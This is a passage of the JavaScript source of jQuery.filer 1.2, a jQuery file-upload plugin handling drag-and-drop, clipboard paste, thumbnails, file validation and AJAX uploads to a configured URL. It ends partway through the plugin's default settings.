/*!
 * jQuery.filer
 * Copyright (c) 2016 CreativeDream
 * Website: https://github.com/CreativeDream/jquery.filer
 * Version: 1.2 (22-Aug-2016)
 * Requires: jQuery v1.7.1 or later
 */
(function($) {
    "use strict";
    $.fn.filer = function(q) {
        return this.each(function(t, r) {
            var s = $(r),
                b = '.jFiler',
                p = $(),
                o = $(),
                l = $(),
                sl = [],
                n_f = $.isFunction(q) ? q(s, $.fn.filer.defaults) : q,
                n = n_f && $.isPlainObject(n_f) ? $.extend(true, {}, $.fn.filer.defaults, n_f) : $.fn.filer.defaults,
                f = {
                    init: function() {
                        s.wrap('<div class="jFiler"></div>');
                        f._set('props');
                        s.prop("jFiler").boxEl = p = s.closest(b);
                        f._changeInput();
                    },
                    _bindInput: function() {
                        if (n.changeInput && o.length > 0) {
                            o.on("click", f._clickHandler);
                        }
                        s.on({
                            "focus": function() {
                                o.addClass('focused');
                            },
                            "blur": function() {
                                o.removeClass('focused');
                            },
                            "change": function() {
                                f._onChange();
                            }
                        });
                        if (n.dragDrop) {
                            o.on("drag dragstart dragend dragover dragenter dragleave drop", function(e) {
                                e.preventDefault();
                                e.stopPropagation();
                            });
                            o.on("drop", f._dragDrop.drop);
                            o.on("dragover", f._dragDrop.dragEnter);
                            o.on("dragleave", f._dragDrop.dragLeave);
                        }
                        if (n.uploadFile && n.clipBoardPaste) {
                            $(window)
                                .on("paste", f._clipboardPaste);
                        }
                    },
                    _unbindInput: function() {
                        if (n.changeInput && o.length > 0) {
                            o.off("click", f._clickHandler);
                        }
                    },
                    _clickHandler: function() {
                        s.click()
                    },
                    _applyAttrSettings: function() {
                        var d = ["name", "limit", "maxSize", "extensions", "changeInput", "showThumbs", "appendTo", "theme", "addMore", "excludeName", "files", "uploadUrl", "uploadData", "options"];
                        for (var k in d) {
                            var j = "data-jfiler-" + d[k];
                            if (f._assets.hasAttr(j)) {
                                switch (d[k]) {
                                    case "changeInput":
                                    case "showThumbs":
                                    case "addMore":
                                        n[d[k]] = (["true", "false"].indexOf(s.attr(j)) > -1 ? s.attr(j) == "true" : s.attr(j));
                                        break;
                                    case "extensions":
                                        n[d[k]] = s.attr(j)
                                            .replace(/ /g, '')
                                            .split(",");
                                        break;
                                    case "uploadUrl":
                                        if (n.uploadFile) n.uploadFile.url = s.attr(j);
                                        break;
                                    case "uploadData":
                                        if (n.uploadFile) n.uploadFile.data = JSON.parse(s.attr(j));
                                        break;
                                    case "files":
                                    case "options":
                                        n[d[k]] = JSON.parse(s.attr(j));
                                        break;
                                    default:
                                        n[d[k]] = s.attr(j);
                                }
                                s.removeAttr(j);
                            }
                        }
                    },
                    _changeInput: function() {
                        f._applyAttrSettings();
                        n.beforeRender != null && typeof n.beforeRender == "function" ? n.beforeRender(p, s) : null;
                        if (n.theme) {
                            p.addClass('jFiler-theme-' + n.theme);
                        }
                        if (s.get(0)
                            .tagName.toLowerCase() != "input" && s.get(0)
                            .type != "file") {
                            o = s;
                            s = $("<input type=\"file\" name=\"" + n.name + "\" />");
                            s.css({
                                position: "absolute",
                                left: "-9999px",
                                top: "-9999px",
                                "z-index": "-9999"
                            });
                            p.prepend(s);
                            f._isGn = s;
                        } else {
                            if (n.changeInput) {
                                switch (typeof n.changeInput) {
                                    case "boolean":
                                        o = $('<div class="jFiler-input"><div class="jFiler-input-caption"><span>' + n.captions.feedback + '</span></div><div class="jFiler-input-button">' + n.captions.button + '</div></div>"');
                                        break;
                                    case "string":
                                    case "object":
                                        o = $(n.changeInput);
                                        break;
                                    case "function":
                                        o = $(n.changeInput(p, s, n));
                                        break;
                                }
                                s.after(o);
                                s.css({
                                    position: "absolute",
                                    left: "-9999px",
                                    top: "-9999px",
                                    "z-index": "-9999"
                                });
                            }
                        }
                        s.prop("jFiler").newInputEl = o;
                        if (!n.limit || (n.limit && n.limit >= 2)) {
                            s.attr("multiple", "multiple");
                            s.attr("name")
                                .slice(-2) != "[]" ? s.attr("name", s.attr("name") + "[]") : null;
                        }
                        f._bindInput();
                        if (n.files) {
                            f._append(false, {
                                files: n.files
                            });
                        }
                        n.afterRender != null && typeof n.afterRender == "function" ? n.afterRender(l, p, o, s) : null;
                    },
                    _clear: function() {
                        f.files = null;
                        s.prop("jFiler")
                            .files = null;
                        if (!n.uploadFile && !n.addMore) {
                            f._reset();
                        }
                        f._set('feedback', (f._itFl && f._itFl.length > 0 ? f._itFl.length + ' ' + n.captions.feedback2 : n.captions.feedback));
                        n.onEmpty != null && typeof n.onEmpty == "function" ? n.onEmpty(p, o, s) : null
                    },
                    _reset: function(a) {
                        if (!a) {
                            if (!n.uploadFile && n.addMore) {
                                for (var i = 0; i < sl.length; i++) {
                                    sl[i].remove();
                                }
                                sl = [];
                                f._unbindInput();
                                if (f._isGn) {
                                    s = f._isGn;
                                } else {
                                    s = $(r);
                                }
                                f._bindInput();
                            }
                            f._set('input', '');
                        }
                        f._itFl = [];
                        f._itFc = null;
                        f._ajFc = 0;
                        f._set('props');
                        s.prop("jFiler")
                            .files_list = f._itFl;
                        s.prop("jFiler")
                            .current_file = f._itFc;
                        if (!f._prEr) {
                            f._itFr = [];
                            p.find("input[name^='jfiler-items-exclude-']:hidden")
                                .remove();
                        }
                        l.fadeOut("fast", function() {
                            $(this)
                                .remove();
                        });
                        s.prop("jFiler").listEl = l = $();
                    },
                    _set: function(element, value) {
                        switch (element) {
                            case 'input':
                                s.val("");
                                break;
                            case 'feedback':
                                if (o.length > 0) {
                                    o.find('.jFiler-input-caption span')
                                        .html(value);
                                }
                                break;
                            case 'props':
                                if (!s.prop("jFiler")) {
                                    s.prop("jFiler", {
                                        options: n,
                                        listEl: l,
                                        boxEl: p,
                                        newInputEl: o,
                                        inputEl: s,
                                        files: f.files,
                                        files_list: f._itFl,
                                        current_file: f._itFc,
                                        append: function(data) {
                                            return f._append(false, {
                                                files: [data]
                                            });
                                        },
                                        remove: function(id) {
                                            f._remove(null, {
                                                binded: true,
                                                data: {
                                                    id: id
                                                }
                                            });
                                            return true;
                                        },
                                        reset: function() {
                                            f._reset();
                                            f._clear();
                                            return true;
                                        },
                                        retry: function(data) {
                                            return f._retryUpload(data);
                                        }
                                    })
                                }
                        }
                    },
                    _filesCheck: function() {
                        var s = 0;
                        if (n.limit && f.files.length + f._itFl.length > n.limit) {
                            n.dialogs.alert(f._assets.textParse(n.captions.errors.filesLimit));
                            return false
                        }
                        for (var t = 0; t < f.files.length; t++) {
                            var file = f.files[t],
                                x = file.name.split(".")
                                .pop()
                                .toLowerCase(),
                                m = {
                                    name: file.name,
                                    size: file.size,
                                    size2: f._assets.bytesToSize(file.size),
                                    type: file.type,
                                    ext: x
                                };
                            if (n.extensions != null && $.inArray(x, n.extensions) == -1 && $.inArray(m.type, n.extensions) == -1) {
                                n.dialogs.alert(f._assets.textParse(n.captions.errors.filesType, m));
                                return false;
                            }
                            if ((n.maxSize != null && f.files[t].size > n.maxSize * 1048576) || (n.fileMaxSize != null && f.files[t].size > n.fileMaxSize * 1048576)) {
                                n.dialogs.alert(f._assets.textParse(n.captions.errors.filesSize, m));
                                return false;
                            }
                            if (file.size == 4096 && file.type.length == 0) {
                                n.dialogs.alert(f._assets.textParse(n.captions.errors.folderUpload, m));
                                return false;
                            }
                            if (n.onFileCheck != null && typeof n.onFileCheck == "function" ? n.onFileCheck(m, n, f._assets.textParse) === false : null) {
                                return false;
                            }

                            s += f.files[t].size
                        }
                        if (n.maxSize != null && s >= Math.round(n.maxSize * 1048576)) {
                            n.dialogs.alert(f._assets.textParse(n.captions.errors.filesSizeAll));
                            return false
                        }
                        if ((n.addMore || n.uploadFile)) {
                            var m = f._itFl.filter(function(a, b) {
                                if (a.file.name == file.name && a.file.size == file.size && a.file.type == file.type && (file.lastModified ? a.file.lastModified == file.lastModified : true)) {
                                    return true;
                                }
                            });
                            if (m.length > 0) {
                                return false
                            }
                        }
                        return true;
                    },
                    _thumbCreator: {
                        create: function(i) {
                            var file = f.files[i],
                                id = (f._itFc ? f._itFc.id : i),
                                name = file.name,
                                size = file.size,
                                url = file.file,
                                type = file.type ? file.type.split("/", 1) : ""
                                .toString()
                                .toLowerCase(),
                                ext = name.indexOf(".") != -1 ? name.split(".")
                                .pop()
                                .toLowerCase() : "",
                                progressBar = n.uploadFile ? '<div class="jFiler-jProgressBar">' + n.templates.progressBar + '</div>' : '',
                                opts = {
                                    id: id,
                                    name: name,
                                    size: size,
                                    size2: f._assets.bytesToSize(size),
                                    url: url,
                                    type: type,
                                    extension: ext,
                                    icon: f._assets.getIcon(ext, type),
                                    icon2: f._thumbCreator.generateIcon({
                                        type: type,
                                        extension: ext
                                    }),
                                    image: '<div class="jFiler-item-thumb-image fi-loading"></div>',
                                    progressBar: progressBar,
                                    _appended: file._appended
                                },
                                html = "";
                            if (file.opts) {
                                opts = $.extend({}, file.opts, opts);
                            }
                            html = $(f._thumbCreator.renderContent(opts))
                                .attr("data-jfiler-index", id);
                            html.get(0)
                                .jfiler_id = id;
                            f._thumbCreator.renderFile(file, html, opts);
                            if (file.forList) {
                                return html;
                            }
                            f._itFc.html = html;
                            html.hide()[n.templates.itemAppendToEnd ? "appendTo" : "prependTo"](l.find(n.templates._selectors.list))
                                .show();
                            if (!file._appended) {
                                f._onSelect(i);
                            }
                        },
                        renderContent: function(opts) {
                            return f._assets.textParse((opts._appended ? n.templates.itemAppend : n.templates.item), opts);
                        },
                        renderFile: function(file, html, opts) {
                            if (html.find('.jFiler-item-thumb-image')
                                .length == 0) {
                                return false;
                            }
                            if (file.file && opts.type == "image") {
                                var g = '<img src="' + file.file + '" draggable="false" />',
                                    m = html.find('.jFiler-item-thumb-image.fi-loading');
                                $(g)
                                    .error(function() {
                                        g = f._thumbCreator.generateIcon(opts);
                                        html.addClass('jFiler-no-thumbnail');
                                        m.removeClass('fi-loading')
                                            .html(g);
                                    })
                                    .load(function() {
                                        m.removeClass('fi-loading')
                                            .html(g);
                                    });
                                return true;
                            }
                            if (window.File && window.FileList && window.FileReader && opts.type == "image" && opts.size < 1e+7) {
                                var y = new FileReader;
                                y.onload = function(e) {
                                    var m = html.find('.jFiler-item-thumb-image.fi-loading');
                                    if (n.templates.canvasImage) {
                                        var canvas = document.createElement('canvas'),
                                            context = canvas.getContext('2d'),
                                            img = new Image();

                                        img.onload = function() {
                                            var height = m.height(),
                                                width = m.width(),
                                                heightRatio = img.height / height,
                                                widthRatio = img.width / width,
                                                optimalRatio = heightRatio < widthRatio ? heightRatio : widthRatio,
                                                optimalHeight = img.height / optimalRatio,
                                                optimalWidth = img.width / optimalRatio,
                                                steps = Math.ceil(Math.log(img.width / optimalWidth) / Math.log(2));

                                            canvas.height = height;
                                            canvas.width = width;

                                            if (img.width < canvas.width || img.height < canvas.height || steps <= 1) {
                                                var x = img.width < canvas.width ? canvas.width / 2 - img.width / 2 : img.width > canvas.width ? -(img.width - canvas.width) / 2 : 0,
                                                    y = img.height < canvas.height ? canvas.height / 2 - img.height / 2 : 0
                                                context.drawImage(img, x, y, img.width, img.height);
                                            } else {
                                                var oc = document.createElement('canvas'),
                                                    octx = oc.getContext('2d');
                                                oc.width = img.width * 0.5;
                                                oc.height = img.height * 0.5;
                                                octx.fillStyle = "#fff";
                                                octx.fillRect(0, 0, oc.width, oc.height);
                                                octx.drawImage(img, 0, 0, oc.width, oc.height);
                                                octx.drawImage(oc, 0, 0, oc.width * 0.5, oc.height * 0.5);

                                                context.drawImage(oc, optimalWidth > canvas.width ? optimalWidth - canvas.width : 0, 0, oc.width * 0.5, oc.height * 0.5, 0, 0, optimalWidth, optimalHeight);
                                            }
                                            m.removeClass('fi-loading').html('<img src="' + canvas.toDataURL("image/png") + '" draggable="false" />');
                                        }
                                        img.onerror = function() {
                                            html.addClass('jFiler-no-thumbnail');
                                            m.removeClass('fi-loading')
                                                .html(f._thumbCreator.generateIcon(opts));
                                        }
                                        img.src = e.target.result;
                                    } else {
                                        m.removeClass('fi-loading').html('<img src="' + e.target.result + '" draggable="false" />');
                                    }
                                }
                                y.readAsDataURL(file);
                            } else {
                                var g = f._thumbCreator.generateIcon(opts),
                                    m = html.find('.jFiler-item-thumb-image.fi-loading');
                                html.addClass('jFiler-no-thumbnail');
                                m.removeClass('fi-loading')
                                    .html(g);
                            }
                        },
                        generateIcon: function(obj) {
                            var m = new Array(3);
                            if (obj && obj.type && obj.type[0] && obj.extension) {
                                switch (obj.type[0]) {
                                    case "image":
                                        m[0] = "f-image";
                                        m[1] = "<i class=\"icon-jfi-file-image\"></i>"
                                        break;
                                    case "video":
                                        m[0] = "f-video";
                                        m[1] = "<i class=\"icon-jfi-file-video\"></i>"
                                        break;
                                    case "audio":
                                        m[0] = "f-audio";
                                        m[1] = "<i class=\"icon-jfi-file-audio\"></i>"
                                        break;
                                    default:
                                        m[0] = "f-file f-file-ext-" + obj.extension;
                                        m[1] = (obj.extension.length > 0 ? "." + obj.extension : "");
                                        m[2] = 1
                                }
                            } else {
                                m[0] = "f-file";
                                m[1] = (obj.extension && obj.extension.length > 0 ? "." + obj.extension : "");
                                m[2] = 1
                            }
                            var el = '<span class="jFiler-icon-file ' + m[0] + '">' + m[1] + '</span>';
                            if (m[2] == 1) {
                                var c = f._assets.text2Color(obj.extension);
                                if (c) {
                                    var j = $(el)
                                        .appendTo("body");

                                    j.css('background-color', f._assets.text2Color(obj.extension));
                                    el = j.prop('outerHTML');
                                    j.remove();
                                }
                            }
                            return el;
                        },
                        _box: function(params) {
                            if (n.beforeShow != null && typeof n.beforeShow == "function" ? !n.beforeShow(f.files, l, p, o, s) : false) {
                                return false
                            }
                            if (l.length < 1) {
                                if (n.appendTo) {
                                    var appendTo = $(n.appendTo);
                                } else {
                                    var appendTo = p;
                                }
                                appendTo.find('.jFiler-items')
                                    .remove();
                                l = $('<div class="jFiler-items jFiler-row"></div>');
                                s.prop("jFiler").listEl = l;
                                l.append(f._assets.textParse(n.templates.box))
                                    .appendTo(appendTo);
                                l.on('click', n.templates._selectors.remove, function(e) {
                                    e.preventDefault();
                                    var m = [params ? params.remove.event : e, params ? params.remove.el : $(this).closest(n.templates._selectors.item)],
                                        c = function(a) {
                                            f._remove(m[0], m[1]);
                                        };
                                    if (n.templates.removeConfirmation) {
                                        n.dialogs.confirm(n.captions.removeConfirmation, c);
                                    } else {
                                        c();
                                    }
                                });
                            }
                            for (var i = 0; i < f.files.length; i++) {
                                if (!f.files[i]._appended) f.files[i]._choosed = true;
                                f._addToMemory(i);
                                f._thumbCreator.create(i);
                            }
                        }
                    },
                    _upload: function(i) {
                        var c = f._itFl[i],
                            el = c.html,
                            formData = new FormData();
                        formData.append(s.attr('name'), c.file, (c.file.name ? c.file.name : false));
                        if (n.uploadFile.data != null && $.isPlainObject(typeof(n.uploadFile.data) == "function" ? n.uploadFile.data(c.file) : n.uploadFile.data)) {
                            for (var k in n.uploadFile.data) {
                                formData.append(k, n.uploadFile.data[k])
                            }
                        }

                        f._ajax.send(el, formData, c);
                    },
                    _ajax: {
                        send: function(el, formData, c) {
                            c.ajax = $.ajax({
                                url: n.uploadFile.url,
                                data: formData,
                                type: n.uploadFile.type,
                                enctype: n.uploadFile.enctype,
                                xhr: function() {
                                    var myXhr = $.ajaxSettings.xhr();
                                    if (myXhr.upload) {
                                        myXhr.upload.addEventListener("progress", function(e) {
                                            f._ajax.progressHandling(e, el)
                                        }, false)
                                    }
                                    return myXhr
                                },
                                complete: function(jqXHR, textStatus) {
                                    c.ajax = false;
                                    f._ajFc++;

                                    if (n.uploadFile.synchron && c.id + 1 < f._itFl.length) {
                                        f._upload(c.id + 1);
                                    }

                                    if (f._ajFc >= f.files.length) {
                                        f._ajFc = 0;
                                        s.get(0).value = "";
                                        n.uploadFile.onComplete != null && typeof n.uploadFile.onComplete == "function" ? n.uploadFile.onComplete(l, p, o, s, jqXHR, textStatus) : null;
                                    }
                                },
                                beforeSend: function(jqXHR, settings) {
                                    return n.uploadFile.beforeSend != null && typeof n.uploadFile.beforeSend == "function" ? n.uploadFile.beforeSend(el, l, p, o, s, c.id, jqXHR, settings) : true;
                                },
                                success: function(data, textStatus, jqXHR) {
                                    c.uploaded = true;
                                    n.uploadFile.success != null && typeof n.uploadFile.success == "function" ? n.uploadFile.success(data, el, l, p, o, s, c.id, textStatus, jqXHR) : null
                                },
                                error: function(jqXHR, textStatus, errorThrown) {
                                    c.uploaded = false;
                                    n.uploadFile.error != null && typeof n.uploadFile.error == "function" ? n.uploadFile.error(el, l, p, o, s, c.id, jqXHR, textStatus, errorThrown) : null
                                },
                                statusCode: n.uploadFile.statusCode,
                                cache: false,
                                contentType: false,
                                processData: false
                            });
                            return c.ajax;
                        },
                        progressHandling: function(e, el) {
                            if (e.lengthComputable) {
                                var t = Math.round(e.loaded * 100 / e.total)
                                    .toString();
                                n.uploadFile.onProgress != null && typeof n.uploadFile.onProgress == "function" ? n.uploadFile.onProgress(t, el, l, p, o, s) : null;
                                el.find('.jFiler-jProgressBar')
                                    .find(n.templates._selectors.progressBar)
                                    .css("width", t + "%")
                            }
                        }
                    },
                    _dragDrop: {
                        dragEnter: function(e) {
                            clearTimeout(f._dragDrop._drt);
                            p.addClass('dragged');
                            f._set('feedback', n.captions.drop);
                            n.dragDrop.dragEnter != null && typeof n.dragDrop.dragEnter == "function" ? n.dragDrop.dragEnter(e, o, s, p) : null;
                        },
                        dragLeave: function(e) {
                            clearTimeout(f._dragDrop._drt);
                            f._dragDrop._drt = setTimeout(function(e) {
                                if (!f._dragDrop._dragLeaveCheck(e)) {
                                    f._dragDrop.dragLeave(e);
                                    return false;
                                }
                                p.removeClass('dragged');
                                f._set('feedback', n.captions.feedback);
                                n.dragDrop.dragLeave != null && typeof n.dragDrop.dragLeave == "function" ? n.dragDrop.dragLeave(e, o, s, p) : null;
                            }, 100, e);
                        },
                        drop: function(e) {
                            clearTimeout(f._dragDrop._drt);
                            p.removeClass('dragged');
                            f._set('feedback', n.captions.feedback);
                            if (e && e.originalEvent && e.originalEvent.dataTransfer && e.originalEvent.dataTransfer.files && e.originalEvent.dataTransfer.files.length > 0) {
                                f._onChange(e, e.originalEvent.dataTransfer.files);
                            }
                            n.dragDrop.drop != null && typeof n.dragDrop.drop == "function" ? n.dragDrop.drop(e.originalEvent.dataTransfer.files, e, o, s, p) : null;
                        },
                        _dragLeaveCheck: function(e) {
                            var related = $(e.currentTarget),
                                insideEls = 0;
                            if (!related.is(o)) {
                                insideEls = o.find(related).length;

                                if (insideEls > 0) {
                                    debugger;
                                    return false;
                                }
                            }
                            return true;
                        }
                    },
                    _clipboardPaste: function(e, fromDrop) {
                        if (!fromDrop && (!e.originalEvent.clipboardData && !e.originalEvent.clipboardData.items)) {
                            return
                        }
                        if (fromDrop && (!e.originalEvent.dataTransfer && !e.originalEvent.dataTransfer.items)) {
                            return
                        }
                        if (f._clPsePre) {
                            return
                        }
                        var items = (fromDrop ? e.originalEvent.dataTransfer.items : e.originalEvent.clipboardData.items),
                            b64toBlob = function(b64Data, contentType, sliceSize) {
                                contentType = contentType || '';
                                sliceSize = sliceSize || 512;
                                var byteCharacters = atob(b64Data);
                                var byteArrays = [];
                                for (var offset = 0; offset < byteCharacters.length; offset += sliceSize) {
                                    var slice = byteCharacters.slice(offset, offset + sliceSize);
                                    var byteNumbers = new Array(slice.length);
                                    for (var i = 0; i < slice.length; i++) {
                                        byteNumbers[i] = slice.charCodeAt(i);
                                    }
                                    var byteArray = new Uint8Array(byteNumbers);
                                    byteArrays.push(byteArray);
                                }
                                var blob = new Blob(byteArrays, {
                                    type: contentType
                                });
                                return blob;
                            };
                        if (items) {
                            for (var i = 0; i < items.length; i++) {
                                if (items[i].type.indexOf("image") !== -1 || items[i].type.indexOf("text/uri-list") !== -1) {
                                    if (fromDrop) {
                                        try {
                                            window.atob(e.originalEvent.dataTransfer.getData("text/uri-list")
                                                .toString()
                                                .split(',')[1]);
                                        } catch (e) {
                                            return;
                                        }
                                    }
                                    var blob = (fromDrop ? b64toBlob(e.originalEvent.dataTransfer.getData("text/uri-list")
                                        .toString()
                                        .split(',')[1], "image/png") : items[i].getAsFile());
                                    blob.name = Math.random()
                                        .toString(36)
                                        .substring(5);
                                    blob.name += blob.type.indexOf("/") != -1 ? "." + blob.type.split("/")[1].toString()
                                        .toLowerCase() : ".png";
                                    f._onChange(e, [blob]);
                                    f._clPsePre = setTimeout(function() {
                                        delete f._clPsePre
                                    }, 1000);
                                }
                            }
                        }
                    },
                    _onSelect: function(i) {
                        if (n.uploadFile && !$.isEmptyObject(n.uploadFile)) {
                            if (!n.uploadFile.synchron || (n.uploadFile.synchron && i == 0)) {
                                f._upload(f._itFc.id)
                            }
                        }
                        n.onSelect != null && typeof n.onSelect == "function" ? n.onSelect(f.files[i], f._itFc.html, l, p, o, s) : null;
                        if (i + 1 >= f.files.length) {
                            n.afterShow != null && typeof n.afterShow == "function" ? n.afterShow(l, p, o, s) : null
                        }
                    },
                    _onChange: function(e, d) {
                        if (!d) {
                            if (!s.get(0)
                                .files || typeof s.get(0)
                                .files == "undefined" || s.get(0)
                                .files.length == 0) {
                                if (!n.uploadFile && !n.addMore) {
                                    f._set('input', '');
                                    f._clear();
                                }
                                return false
                            }
                            f.files = s.get(0)
                                .files;
                        } else {
                            if (!d || d.length == 0) {
                                f._set('input', '');
                                f._clear();
                                return false
                            }
                            f.files = d;
                        }
                        if (!n.uploadFile && !n.addMore) {
                            f._reset(true);
                        }
                        s.prop("jFiler")
                            .files = f.files;
                        if (!f._filesCheck() || (n.beforeSelect != null && typeof n.beforeSelect == "function" ? !n.beforeSelect(f.files, l, p, o, s) : false)) {
                            f._set('input', '');
                            f._clear();
                            return false
                        }
                        f._set('feedback', f.files.length + f._itFl.length + ' ' + n.captions.feedback2);
                        if (n.showThumbs) {
                            f._thumbCreator._box();
                        } else {
                            for (var i = 0; i < f.files.length; i++) {
                                f.files[i]._choosed = true;
                                f._addToMemory(i);
                                f._onSelect(i);
                            }
                        }
                        if (!n.uploadFile && n.addMore) {
                            var elem = $('<input type="file" />');
                            var attributes = s.prop("attributes");
                            $.each(attributes, function() {
                                elem.attr(this.name, this.value);
                            });
                            s.after(elem);
                            f._unbindInput();
                            sl.push(elem);
                            s = elem;
                            f._bindInput();
                            f._set('props');
                        }
                    },
                    _append: function(e, data) {
                        var files = (!data ? false : data.files);
                        if (!files || files.length <= 0) {
                            return;
                        }
                        f.files = files;
                        s.prop("jFiler")
                            .files = f.files;
                        if (n.showThumbs) {
                            for (var i = 0; i < f.files.length; i++) {
                                f.files[i]._appended = true;
                            }
                            f._thumbCreator._box();
                        }
                    },
                    _getList: function(e, data) {
                        var files = (!data ? false : data.files);
                        if (!files || files.length <= 0) {
                            return;
                        }
                        f.files = files;
                        s.prop("jFiler")
                            .files = f.files;
                        if (n.showThumbs) {
                            var returnData = [];
                            for (var i = 0; i < f.files.length; i++) {
                                f.files[i].forList = true;
                                returnData.push(f._thumbCreator.create(i));
                            }
                            if (data.callback) {
                                data.callback(returnData, l, p, o, s);
                            }
                        }
                    },
                    _retryUpload: function(e, data) {
                        var id = parseInt(typeof data == "object" ? data.attr("data-jfiler-index") : data),
                            obj = f._itFl.filter(function(value, key) {
                                return value.id == id;
                            });
                        if (obj.length > 0) {
                            if (n.uploadFile && !$.isEmptyObject(n.uploadFile) && !obj[0].uploaded) {
                                f._itFc = obj[0];
                                s.prop("jFiler")
                                    .current_file = f._itFc;
                                f._upload(id);
                                return true;
                            }
                        } else {
                            return false;
                        }
                    },
                    _remove: function(e, el) {
                        if (el.binded) {
                            if (typeof(el.data.id) != "undefined") {
                                el = l.find(n.templates._selectors.item + "[data-jfiler-index='" + el.data.id + "']");
                                if (el.length == 0) {
                                    return false
                                }
                            }
                            if (el.data.el) {
                                el = el.data.el;
                            }
                        }
                        var attrId = el.get(0)
                            .jfiler_id || el.attr('data-jfiler-index'),
                            id = null,
                            excl_input = function(id) {
                                var input = p.find("input[name^='jfiler-items-exclude-']:hidden")
                                    .first(),
                                    item = f._itFl[id],
                                    val = [];
                                if (input.length == 0) {
                                    input = $('<input type="hidden" name="jfiler-items-exclude-' + (n.excludeName ? n.excludeName : (s.attr("name")
                                        .slice(-2) != "[]" ? s.attr("name") : s.attr("name")
                                        .substring(0, s.attr("name")
                                            .length - 2)) + "-" + t) + '">');
                                    input.appendTo(p);
                                }
                                if (item.file._choosed || item.file._appended || item.uploaded) {
                                    f._prEr = true;
                                    f._itFr.push(item);
                                    for (var i = 0; i < f._itFr.length; i++) {
                                        val.push(f._itFr[i].file.name);
                                    }
                                    val = JSON.stringify(val);
                                    input.val(val);
                                }
                            },
                            callback = function(el, id) {
                                excl_input(id);
                                f._itFl.splice(id, 1);
                                if (f._itFl.length < 1) {
                                    f._reset();
                                    f._clear();
                                } else {
                                    f._set('feedback', f._itFl.length + ' ' + n.captions.feedback2);
                                }
                                el.fadeOut("fast", function() {
                                    $(this)
                                        .remove();
                                });
                            };
                        for (var key in f._itFl) {
                            if (key === 'length' || !f._itFl.hasOwnProperty(key)) continue;
                            if (f._itFl[key].id == attrId) {
                                id = key;
                            }
                        }
                        if (!f._itFl.hasOwnProperty(id)) {
                            return false
                        }
                        if (f._itFl[id].ajax) {
                            f._itFl[id].ajax.abort();
                            callback(el, id);
                            return;
                        }
                        if (n.onRemove != null && typeof n.onRemove == "function" ? n.onRemove(el, f._itFl[id].file, id, l, p, o, s) !== false : true) {
                            callback(el, id);
                        }
                    },
                    _addToMemory: function(i) {
                        f._itFl.push({
                            id: f._itFl.length,
                            file: f.files[i],
                            html: $(),
                            ajax: false,
                            uploaded: false,
                        });
                        if (n.addMore || f.files[i]._appended) f._itFl[f._itFl.length - 1].input = s;
                        f._itFc = f._itFl[f._itFl.length - 1];
                        s.prop("jFiler")
                            .files_list = f._itFl;
                        s.prop("jFiler")
                            .current_file = f._itFc;
                    },
                    _assets: {
                        bytesToSize: function(bytes) {
                            if (bytes == 0) return '0 Byte';
                            var k = 1000;
                            var sizes = ['Bytes', 'KB', 'MB', 'GB', 'TB', 'PB', 'EB', 'ZB', 'YB'];
                            var i = Math.floor(Math.log(bytes) / Math.log(k));
                            return (bytes / Math.pow(k, i))
                                .toPrecision(3) + ' ' + sizes[i];
                        },
                        hasAttr: function(attr, el) {
                            var el = (!el ? s : el),
                                a = el.attr(attr);
                            if (!a || typeof a == "undefined") {
                                return false;
                            } else {
                                return true;
                            }
                        },
                        getIcon: function(ext, type) {
                            var types = ["image"];
                            if ($.inArray(type, types) > -1) {
                                return '<i class="icon-jfi-file-' + type + ' jfi-file-ext-' + ext + '"></i>';
                            }
                            return '<i class="icon-jfi-file-o jfi-file-type-' + type + ' jfi-file-ext-' + ext + '"></i>';
                        },
                        textParse: function(text, opts) {
                            opts = $.extend({}, {
                                limit: n.limit,
                                maxSize: n.maxSize,
                                fileMaxSize: n.fileMaxSize,
                                extensions: n.extensions ? n.extensions.join(',') : null,
                            }, (opts && $.isPlainObject(opts) ? opts : {}), n.options);
                            switch (typeof(text)) {
                                case "string":
                                    return text.replace(/\{\{fi-(.*?)\}\}/g, function(match, a) {
                                        a = a.replace(/ /g, '');
                                        if (a.match(/(.*?)\|limitTo\:(\d+)/)) {
                                            return a.replace(/(.*?)\|limitTo\:(\d+)/, function(match, a, b) {
                                                var a = (opts[a] ? opts[a] : ""),
                                                    str = a.substring(0, b);
                                                str = (a.length > str.length ? str.substring(0, str.length - 3) + "..." : str);
                                                return str;
                                            });
                                        } else {
                                            return (opts[a] ? opts[a] : "");
                                        }
                                    });
                                    break;
                                case "function":
                                    return text(opts);
                                    break;
                                default:
                                    return text;
                            }
                        },
                        text2Color: function(str) {
                            if (!str || str.length == 0) {
                                return false
                            }
                            for (var i = 0, hash = 0; i < str.length; hash = str.charCodeAt(i++) + ((hash << 5) - hash));
                            for (var i = 0, colour = "#"; i < 3; colour += ("00" + ((hash >> i++ * 2) & 0xFF)
                                    .toString(16))
                                .slice(-2));
                            return colour;
                        }
                    },
                    files: null,
                    _itFl: [],
                    _itFc: null,
                    _itFr: [],
                    _itPl: [],
                    _ajFc: 0,
                    _prEr: false
                }

            s.on("filer.append", function(e, data) {
                f._append(e, data)
            }).on("filer.remove", function(e, data) {
                data.binded = true;
                f._remove(e, data);
            }).on("filer.reset", function(e) {
                f._reset();
                f._clear();
                return true;
            }).on("filer.generateList", function(e, data) {
                return f._getList(e, data)
            }).on("filer.retry", function(e, data) {
                return f._retryUpload(e, data)
            });

            f.init();

            return this;
        });
    };
    $.fn.filer.defaults = {
        limit: null,
        maxSize: null,
        fileMaxSize: null,
        extensions: null,
        changeInput: true,
        showThumbs: false,
        appendTo: null,
        theme: 'default',
        templates: {
            box: '<ul class="jFiler-items-list jFiler-items-default"></ul>',
            item: '<li class="jFiler-item"><div class="jFiler-item-container"><div class="jFiler-item-inner"><div class="jFiler-item-icon pull-left">{{fi-icon}}</div><div class="jFiler-item-info pull-left"><div class="jFiler-item-title" title="{{fi-name}}">{{fi-name | limitTo:30}}</div><div class="jFiler-item-others"><span>size: {{fi-size2}}</span><span>type: {{fi-extension}}</span><span class="jFiler-item-status">{{fi-progressBar}}</span></div><div class="jFiler-item-assets"><ul class="list-inline"><li><a class="icon-jfi-trash jFiler-item-trash-action"></a></li></ul></div></div></div></div></li>',
